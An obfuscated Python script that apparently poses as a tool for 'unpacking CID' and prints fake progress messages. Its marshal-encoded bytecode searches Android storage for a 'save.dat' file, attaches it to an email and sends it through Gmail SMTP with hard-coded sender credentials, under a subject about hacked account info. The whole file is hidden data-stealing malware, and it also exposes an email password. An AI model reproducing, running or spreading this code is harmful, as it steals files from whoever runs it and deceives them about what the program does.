import sys
import marshal

if sys.version[:3] == '3.9':
    exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00@\x00\x00\x00s\xea\x00\x00\x00d\x00Z\x00e\x00r\x10d\x01d\x02\x84!Z\x01e\x02e\x03\xa0\x04d\x03\xa1\x01\x83\x01Z\x05d\x02d\x04l\x06Z\x06d\x02d\x04l\x07Z\x07d\x02d\x04l\x08Z\x08d\x02d\x05l\tm\nZ\n\x01\x00d\x02d\x06l\x0bm\x0cZ\x0c\x01\x00d\x02d\x07l\rm\x0eZ\x0e\x01\x00d\x02d\x08l\x0fm\x10Z\x10\x01\x00d\x02d\tl\x11m\x12Z\x12\x01\x00e\x13e\x02e\x03\xa0\x04d\n\xa1\x01\x83\x01\x83\x01\x01\x00e\x08\xa0\x14d\x0b\xa1\x01\x01\x00e\x13e\x02e\x03\xa0\x04d\x0c\xa1\x01\x83\x01\x83\x01\x01\x00e\x08\xa0\x14d\r\xa1\x01\x01\x00e\x13e\x02e\x03\xa0\x04d\x0e\xa1\x01\x83\x01\x83\x01\x01\x00e\x08\xa0\x14d\x0f\xa1\x01\x01\x00e\x13e\x02e\x03\xa0\x04d\n\xa1\x01\x83\x01\x83\x01\x01\x00d\x10d\x11\x84\x00Z\x15e\x15\x83\x00\x01\x00d\x04S\x00)\x12F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00s\x97\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\t\xe9@\x00\x00\x00\xe9p\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00\xe9_\x00\x00\x00\xe9t\x00\x00\x00\xe9e\x00\x00\x00\xe9a\x00\x00\x00\xe9m\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0b\x00\x00\x00r\x0b\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00N)\x01\xda\x0cEmailMessage)\x01\xda\x08MIMEText)\x01\xda\rMIMEMultipart)\x01\xda\x08MIMEBase)\x01\xda\x08encoderss\xb0\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x0e\xe9P\x00\x00\x00\xe9l\x00\x00\x00\xe9e\x00\x00\x00\xe9a\x00\x00\x00\xe9s\x00\x00\x00r\x02\x00\x00\x00\xe9 \x00\x00\x00\xe9W\x00\x00\x00r\x03\x00\x00\x00\xe9i\x00\x00\x00\xe9t\x00\x00\x00\xe9.\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00gffffff\n@s\xba\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x10\xe9U\x00\x00\x00\xe9n\x00\x00\x00\xe9p\x00\x00\x00\xe9a\x00\x00\x00\xe9c\x00\x00\x00\xe9k\x00\x00\x00\xe9i\x00\x00\x00r\x01\x00\x00\x00\xe9g\x00\x00\x00\xe9 \x00\x00\x00\xe9C\x00\x00\x00\xe9I\x00\x00\x00\xe9D\x00\x00\x00\xe9.\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0f\x00\x00\x00r\x0f\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00g\x9a\x99\x99\x99\x99\x99\t@s\xbf\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x11\xe9E\x00\x00\x00\xe9x\x00\x00\x00\xe9t\x00\x00\x00\xe9r\x00\x00\x00\xe9a\x00\x00\x00\xe9c\x00\x00\x00r\x02\x00\x00\x00\xe9i\x00\x00\x00\xe9n\x00\x00\x00\xe9g\x00\x00\x00\xe9 \x00\x00\x00\xe9C\x00\x00\x00\xe9I\x00\x00\x00\xe9D\x00\x00\x00\xe9.\x00\x00\x00r\r\x00\x00\x00r\r\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00g\xcd\xcc\xcc\xcc\xcc\xcc\xf4?c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\n\x00\x00\x00C\x00\x00\x00s\xb0\x01\x00\x00t\x00\xa0\x01t\x02t\x03\xa0\x04d\x01\xa1\x01\x83\x01\xa1\x01D\x00\x90\x01]\x94\\\x03}\x00}\x01}\x02|\x02D\x00\x90\x01]\x82}\x03|\x03\xa0\x05t\x02t\x03\xa0\x04d\x02\xa1\x01\x83\x01\xa1\x01r$t\x00j\x06\xa0\x07|\x00|\x03\xa1\x02}\x04|\x04t\x00j\x06\xa0\x07|\x00|\x03\xa1\x02k\x02r^t\x02t\x03\xa0\x04d\x03\xa1\x01\x83\x01}\x05t\x02t\x03\xa0\x04d\x04\xa1\x01\x83\x01}\x06t\x02t\x03\xa0\x04d\x03\xa1\x01\x83\x01}\x07d\x05}\x08t\x08\x83\x00}\t|\x05|\tt\x02t\x03\xa0\x04d\x06\xa1\x01\x83\x01<\x00|\x07|\tt\x02t\x03\xa0\x04d\x07\xa1\x01\x83\x01<\x00|\x08|\tt\x02t\x03\xa0\x04d\x08\xa1\x01\x83\x01<\x00t\x02t\x03\xa0\x04d\t\xa1\x01\x83\x01}\n|\t\xa0\tt\n|\nt\x02t\x03\xa0\x04d\n\xa1\x01\x83\x01\x83\x02\xa1\x01\x01\x00t\x0b|\x04t\x02t\x03\xa0\x04d\x0b\xa1\x01\x83\x01\x83\x02}\x0bt\x0ct\x02t\x03\xa0\x04d\x0c\xa1\x01\x83\x01t\x02t\x03\xa0\x04d\r\xa1\x01\x83\x01\x83\x02}\x0c|\x0c\xa0\r|\x0b\xa0\x0e\xa1\x00\xa1\x01\x01\x00t\x0f\xa0\x10|\x0c\xa1\x01\x01\x00|\x0c\xa0\x11t\x02t\x03\xa0\x04d\x0e\xa1\x01\x83\x01t\x02t\x03\xa0\x04d\x0f\xa1\x01\x83\x01|\x04\x17\x00\xa1\x02\x01\x00|\t\xa0\t|\x0c\xa1\x01\x01\x00|\t\xa0\x12\xa1\x00}\rt\x13\xa0\x14t\x02t\x03\xa0\x04d\x10\xa1\x01\x83\x01d\x11\xa1\x02}\x0e|\x0e\xa0\x15|\x05|\x06\xa1\x02\x01\x00|\x0e\xa0\x16|\x05|\x07|\r\xa1\x03\x01\x00|\x0e\xa0\x17\xa1\x00\x01\x00q$q\x14d\x00S\x00)\x12Ns\x91\x01\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01);\xe9/\x00\x00\x00\xe9s\x00\x00\x00\xe9t\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9a\x00\x00\x00\xe9g\x00\x00\x00\xe9e\x00\x00\x00r\x00\x00\x00\x00r\x07\x00\x00\x00\xe9m\x00\x00\x00\xe9u\x00\x00\x00\xe9l\x00\x00\x00r\x05\x00\x00\x00r\x02\x00\x00\x00r\x07\x00\x00\x00\xe9d\x00\x00\x00r\x00\x00\x00\x00\xe90\x00\x00\x00r\x00\x00\x00\x00\xe9A\x00\x00\x00\xe9n\x00\x00\x00r\x0b\x00\x00\x00r\x04\x00\x00\x00r\x03\x00\x00\x00\xe9i\x00\x00\x00r\x0b\x00\x00\x00r\x00\x00\x00\x00\xe9D\x00\x00\x00r\x05\x00\x00\x00r\x02\x00\x00\x00r\x05\x00\x00\x00r\x00\x00\x00\x00\xe9c\x00\x00\x00r\x03\x00\x00\x00r\x08\x00\x00\x00\xe9.\x00\x00\x00r\x04\x00\x00\x00r\x02\x00\x00\x00r\x01\x00\x00\x00r\x03\x00\x00\x00\xe9f\x00\x00\x00r\x02\x00\x00\x00r\x12\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x03\x00\x00\x00\xe9w\x00\x00\x00r\x02\x00\x00\x00r\x03\x00\x00\x00\xe9p\x00\x00\x00r\x0f\x00\x00\x00r\x05\x00\x00\x00r\x00\x00\x00\x00r\x13\x00\x00\x00r\x0f\x00\x00\x00r\n\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x18\x00\x00\x00r\x18\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\x92\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x08\xe9s\x00\x00\x00\xe9a\x00\x00\x00\xe9v\x00\x00\x00\xe9e\x00\x00\x00\xe9.\x00\x00\x00\xe9d\x00\x00\x00r\x01\x00\x00\x00\xe9t\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\t\x00\x00\x00r\t\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9s\x00\x00\x00\xe9t\x00\x00\x00\xe9e\x00\x00\x00\xe9a\x00\x00\x00\xe9l\x00\x00\x00r\x02\x00\x00\x00\xe9r\x00\x00\x00\xe9g\x00\x00\x00r\x01\x00\x00\x00\xe96\x00\x00\x00\xe99\x00\x00\x00\xe9@\x00\x00\x00r\x06\x00\x00\x00\xe9m\x00\x00\x00r\x03\x00\x00\x00\xe9i\x00\x00\x00r\x04\x00\x00\x00\xe9.\x00\x00\x00\xe9c\x00\x00\x00\xe9o\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x11\x00\x00\x00r\x11\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\xa1\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x0b\xe9B\x00\x00\x00\xe9i\x00\x00\x00\xe9g\x00\x00\x00\xe9h\x00\x00\x00\xe9o\x00\x00\x00\xe9u\x00\x00\x00\xe9s\x00\x00\x00\xe9e\x00\x00\x00\xe91\x00\x00\x00\xe92\x00\x00\x00\xe93\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\r\x00\x00\x00r\r\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xda\x07subjects~\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x04\xe9F\x00\x00\x00\xe9r\x00\x00\x00\xe9o\x00\x00\x00\xe9m\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00sr\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00d\x00d\x01g\x02\x83\x01\xa0\x01\xa1\x00S\x00)\x02\xe9T\x00\x00\x00\xe9o\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x04\x00\x00\x00r\x04\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\x8d\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x07\xe9S\x00\x00\x00\xe9u\x00\x00\x00\xe9b\x00\x00\x00\xe9j\x00\x00\x00\xe9e\x00\x00\x00\xe9c\x00\x00\x00\xe9t\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\t\x00\x00\x00r\t\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s2\x01\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)(\xe9Y\x00\x00\x00\xe9o\x00\x00\x00\xe9u\x00\x00\x00\xe9r\x00\x00\x00\xe9 \x00\x00\x00\xe9G\x00\x00\x00r\x03\x00\x00\x00r\x01\x00\x00\x00\xe9w\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9p\x00\x00\x00\xe9i\x00\x00\x00\xe9a\x00\x00\x00r\x04\x00\x00\x00\xe9H\x00\x00\x00r\n\x00\x00\x00\xe9c\x00\x00\x00\xe9k\x00\x00\x00\xe9e\x00\x00\x00\xe9d\x00\x00\x00r\x04\x00\x00\x00r\x04\x00\x00\x00\xe9A\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x01\x00\x00\x00r\x02\x00\x00\x00\xe9n\x00\x00\x00r\x07\x00\x00\x00\xe9s\x00\x00\x00r\x04\x00\x00\x00\xe9I\x00\x00\x00r\x12\x00\x00\x00r\x04\x00\x00\x00r\x0b\x00\x00\x00r\x0e\x00\x00\x00r\x03\x00\x00\x00r\x0e\x00\x00\x00\xe9!\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x17\x00\x00\x00r\x17\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\x83\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x05\xe9p\x00\x00\x00\xe9l\x00\x00\x00\xe9a\x00\x00\x00\xe9i\x00\x00\x00\xe9n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x07\x00\x00\x00r\x07\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00sr\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00d\x00d\x01g\x02\x83\x01\xa0\x01\xa1\x00S\x00)\x02\xe9r\x00\x00\x00\xe9b\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x04\x00\x00\x00r\x04\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\xa1\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x0b\xe9a\x00\x00\x00\xe9p\x00\x00\x00r\x01\x00\x00\x00\xe9l\x00\x00\x00\xe9i\x00\x00\x00\xe9c\x00\x00\x00r\x00\x00\x00\x00\xe9t\x00\x00\x00r\x03\x00\x00\x00\xe9o\x00\x00\x00\xe9n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\n\x00\x00\x00r\n\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\xa6\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x0c\xe9o\x00\x00\x00\xe9c\x00\x00\x00\xe9t\x00\x00\x00\xe9e\x00\x00\x00r\x02\x00\x00\x00\xe9-\x00\x00\x00\xe9s\x00\x00\x00r\x02\x00\x00\x00\xe9r\x00\x00\x00r\x03\x00\x00\x00\xe9a\x00\x00\x00\xe9m\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0b\x00\x00\x00r\x0b\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\xc9\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x13\xe9C\x00\x00\x00\xe9o\x00\x00\x00\xe9n\x00\x00\x00\xe9t\x00\x00\x00\xe9e\x00\x00\x00r\x02\x00\x00\x00r\x03\x00\x00\x00\xe9-\x00\x00\x00\xe9D\x00\x00\x00\xe9i\x00\x00\x00\xe9s\x00\x00\x00\xe9p\x00\x00\x00r\x01\x00\x00\x00r\x08\x00\x00\x00r\x07\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00r\x02\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\xce\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x14\xe9a\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00r\x00\x00\x00\x00\xe9c\x00\x00\x00\xe9h\x00\x00\x00\xe9m\x00\x00\x00\xe9e\x00\x00\x00\xe9n\x00\x00\x00r\x01\x00\x00\x00\xe9;\x00\x00\x00\xe9f\x00\x00\x00\xe9i\x00\x00\x00\xe9l\x00\x00\x00r\x05\x00\x00\x00r\x06\x00\x00\x00r\x00\x00\x00\x00r\x04\x00\x00\x00r\x05\x00\x00\x00\xe9=\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00s\xb0\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x0e\xe9s\x00\x00\x00\xe9m\x00\x00\x00\xe9t\x00\x00\x00\xe9p\x00\x00\x00\xe9.\x00\x00\x00\xe9g\x00\x00\x00r\x01\x00\x00\x00\xe9a\x00\x00\x00\xe9i\x00\x00\x00\xe9l\x00\x00\x00r\x04\x00\x00\x00\xe9c\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\r\x00\x00\x00r\r\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00i\xd1\x01\x00\x00)\x18\xda\x02os\xda\x04walk\xda\x04eval\xda\x07marshal\xda\x05loads\xda\x08endswith\xda\x04path\xda\x04joinr\x05\x00\x00\x00Z\x06attachr\x04\x00\x00\x00\xda\x04openr\x06\x00\x00\x00Z\x0bset_payload\xda\x04readr\x07\x00\x00\x00Z\rencode_base64Z\nadd_headerZ\tas_string\xda\x07smtplibZ\x08SMTP_SSL\xda\x05loginZ\x08sendmail\xda\x04quit)\x0f\xda\x04root\xda\x04dirs\xda\x05files\xda\x04fileZ\x03pisZ\nemail_userZ\x0eemail_passwordZ\nemail_sendr\x08\x00\x00\x00\xda\x03msg\xda\x04body\xda\nattachment\xda\x04part\xda\x04text\xda\x06server\xa9\x00r \x00\x00\x00\xda\x06string\xda\x03fsf\x17\x00\x00\x00s4\x00\x00\x00\x00\x01 \x01\n\x01\x14\x01\x0e\x01\x12\x03\x0e\x01\x0e\x01\x0e\x01\x04\x02\x06\x01\x12\x01\x12\x01\x12\x02\x0e\x01\x1a\x02\x14\x02\x1e\x01\x0e\x01\n\x01$\x01\n\x01\x08\x01\x16\x01\x0c\x01\x0e\x01r"\x00\x00\x00)\x16Z\x03fooZ\x03barr\x0b\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\tcopyrightr\t\x00\x00\x00r\x13\x00\x00\x00\xda\x04timeZ\remail.messager\x03\x00\x00\x00Z\x0femail.mime.textr\x04\x00\x00\x00Z\x14email.mime.multipartr\x05\x00\x00\x00Z\x0femail.mime.baser\x06\x00\x00\x00\xda\x05emailr\x07\x00\x00\x00\xda\x05print\xda\x05sleepr"\x00\x00\x00r \x00\x00\x00r \x00\x00\x00r \x00\x00\x00r!\x00\x00\x00\xda\x08<module>\x02\x00\x00\x00s(\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x01\x08\x01\x0c\x01\x0c\x01\x0c\x01\x0c\x01\x0c\x02\x12\x01\n\x01\x12\x01\n\x01\x12\x01\n\x01\x12\x02\x08$'))
else:
    print(f'# no support for "%s"' % sys.version.split(" ")[0])